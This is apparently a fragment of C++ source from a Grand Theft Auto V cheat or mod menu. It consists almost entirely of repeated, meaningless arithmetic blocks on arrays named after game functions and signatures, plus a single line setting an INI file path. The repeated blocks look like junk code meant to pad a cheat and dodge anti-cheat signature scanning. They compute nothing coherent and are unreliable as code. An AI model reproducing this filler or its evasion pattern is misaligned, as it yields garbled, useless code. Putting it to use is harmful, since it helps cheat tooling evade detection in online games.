		GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
		GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
		GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
		}
		else
		{
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (5) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
		if (TriggerScriptEvent[4] > 50.0f)
		{
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
		}
		a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
		a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		a = 0.0f;
		a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
		b = 0.0f;
		TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
		TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		TriggerScriptEvent[4] = TriggerScriptEvent[1];
		TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
		offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
		offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
		TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
		offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

		if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
		}
		else
		{
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		}
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
		a = 0.0f;
		b = 0.0f;
		if (TriggerScriptEvent[4] > 50.0f)
		{
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
		}
		a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
		a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
		a = 0.0f;
		a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
		b = 0.0f;
		TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
		TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
		TriggerScriptEvent[4] = TriggerScriptEvent[1];
		TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
		TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
		TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
		TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
		a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
		TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
		if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
		a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
		Extern_Reader::INIFile::INIFilePath = INIPath;

		if (offset > aaaaaa)
		{
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
			matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
			matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
		}
		else
		{
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
		if (matriz[4] > 50.0f)
		{
			matriz[4] = matriz[1];
		}
		a2 = (matriz[4]) / (2 * matriz[2]);
		a1 = (matriz[3] + (2)) / (2 * matriz[2]);
		offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (matriz[3] + (5)) / (2 * matriz[2]);
		aaaaaa = ponteiro * 2;
		a = 0.0f;
		a1 = (matriz[3] + (4)) / (2 * matriz[2]);
		b = 0.0f;
		matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
		matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
		matriz[4] = matriz[1];
		matriz[7] = (0xB1231 * 0xA) + matriz[2];
		offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
		offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
		matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		a2 = (matriz[4] + (2)) / (2 * matriz[2]);
		offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > aaaaaa)
		{
		}
		else
			a1 = (matriz[3] + (65)) / (2 * matriz[2]);
		a2 = (matriz[4] - (3)) / (2 * matriz[2]);

		if (matriz[1] > aaaaaa)
		{
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
			matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
		}
		else
		{
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		}
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
		a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
		a = 0.0f;
		b = 0.0f;
		if (matriz[4] > 50.0f)
		{
			matriz[4] = matriz[1];
		}
		a2 = (matriz[4]) / (2 * matriz[2]);
		a1 = (matriz[3] + (2)) / (2 * matriz[2]);
		matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (matriz[3] + (5)) / (2 * matriz[2]);
		aaaaaa = 0xB2 * 2;
		a = 0.0f;
		a1 = (matriz[3] + (4)) / (2 * matriz[2]);
		b = 0.0f;
		matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
		matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
		matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
		matriz[4] = matriz[1];
		matriz[7] = (0xB1231 * 0xA) + matriz[2];
		matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
		matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
		matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
		a2 = (matriz[4] + (3)) / (2 * matriz[2]);
		a2 = (matriz[4] + (2)) / (2 * matriz[2]);
		matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		matriz[1] = (0xB1231 * 0xA) + 0xA12;
		if (matriz[1] > aaaaaa)
		{
		}
		else
			a1 = (matriz[3] + (65)) / (2 * matriz[2]);
		a2 = (matriz[4] - (3)) / (2 * matriz[2]);

		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
		}
		else
		{
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		}
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
		if (GTA5_exe_sig_[4] > 50.0f)
		{
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		}
		a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
		a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
		offset = (0xB1231 * 0xA) + 0xA12;
		a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
		a = 0.0f;
		a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
		b = 0.0f;
		GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
		GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
		GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
		offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
		offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
		GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
		a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
		offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
		offset = (0xB1231 * 0xA) + 0xA12;
		offset = (0xB1231 * 0xA) + 0xA12;
		if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
		}
		else
			a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
		a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

		if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
		{
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
		}
		else
		{
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		}
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
		a = 0.0f;
		b = 0.0f;
		if (GTA5_exe_sig_[4] > 50.0f)
		{
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
		}
		a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
		a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
		GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
		GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
		a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
		NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
		a = 0.0f;
		a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
